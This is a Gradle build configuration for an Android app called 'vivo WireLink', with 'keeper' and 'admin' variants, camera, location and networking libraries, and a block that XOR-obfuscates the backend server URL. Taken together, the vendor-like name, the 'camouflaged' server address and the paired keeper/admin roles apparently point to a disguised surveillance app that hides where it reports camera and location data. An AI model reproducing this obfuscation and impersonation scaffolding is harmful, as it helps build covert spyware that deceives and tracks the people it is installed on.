plugins {
    id 'com.android.application'
    id 'org.jetbrains.kotlin.android'
}

// ===== camouflaged backend url =====
// BACKEND_URL + XOR_KEY come from GitHub Actions secrets as env vars at build time.
// URL is XOR'd with the key, base64'd, and only the ciphertext lands in BuildConfig.
def rawBackendUrl = System.getenv("BACKEND_URL") ?: ""
def xorKey        = System.getenv("XOR_KEY")    ?: "local_dev_fallback_key_change_me"
def encodedUrl = ""
if (!rawBackendUrl.isEmpty()) {
    byte[] urlBytes = rawBackendUrl.getBytes("UTF-8")
    byte[] keyBytes = xorKey.getBytes("UTF-8")
    byte[] xored    = new byte[urlBytes.length]
    for (int i = 0; i < urlBytes.length; i++) {
        xored[i] = (byte)(urlBytes[i] ^ keyBytes[i % keyBytes.length])
    }
    encodedUrl = java.util.Base64.getEncoder().encodeToString(xored)
}

android {
    namespace 'com.vivo.wirelink'
    compileSdk 36

    defaultConfig {
        minSdk 24
        versionCode 2
        versionName "1.2"

        buildConfigField "String", "BACKEND_URL_ENC", "\"${encodedUrl}\""
        buildConfigField "String", "XOR_KEY",         "\"${xorKey}\""
    }

    flavorDimensions "role"
    productFlavors {
        keeper {
            dimension "role"
            applicationId "com.vivo.wirelink"
            targetSdk 36
            resValue "string", "app_name", "vivo WireLink"
        }
        admin {
            dimension "role"
            applicationId "com.vivo.wirelink.admin"
            targetSdk 34
            resValue "string", "app_name", "vivo WireLink"
        }
    }

    buildTypes {
        release {
            minifyEnabled false
            shrinkResources false
            signingConfig signingConfigs.debug
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_17
        targetCompatibility JavaVersion.VERSION_17
    }

    kotlinOptions {
        jvmTarget = '17'
    }

    buildFeatures {
        viewBinding true
        buildConfig true
    }

    packaging {
        resources {
            excludes += ['/META-INF/{AL2.0,LGPL2.1}', 'META-INF/DEPENDENCIES']
        }
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.7.0'
    implementation 'androidx.core:core-ktx:1.15.0'
    implementation 'com.google.android.material:material:1.12.0'
    implementation 'androidx.constraintlayout:constraintlayout:2.2.0'
    implementation 'androidx.lifecycle:lifecycle-service:2.8.7'
    implementation 'org.jetbrains.kotlinx:kotlinx-coroutines-android:1.9.0'
    implementation 'com.squareup.okhttp3:okhttp:4.12.0'
    implementation 'com.google.android.gms:play-services-location:21.3.0'

    def camerax = "1.4.1"
    implementation "androidx.camera:camera-core:$camerax"
    implementation "androidx.camera:camera-camera2:$camerax"
    implementation "androidx.camera:camera-lifecycle:$camerax"

    // osmdroid — free OpenStreetMap, no API key
    implementation 'org.osmdroid:osmdroid-android:6.1.20'
}
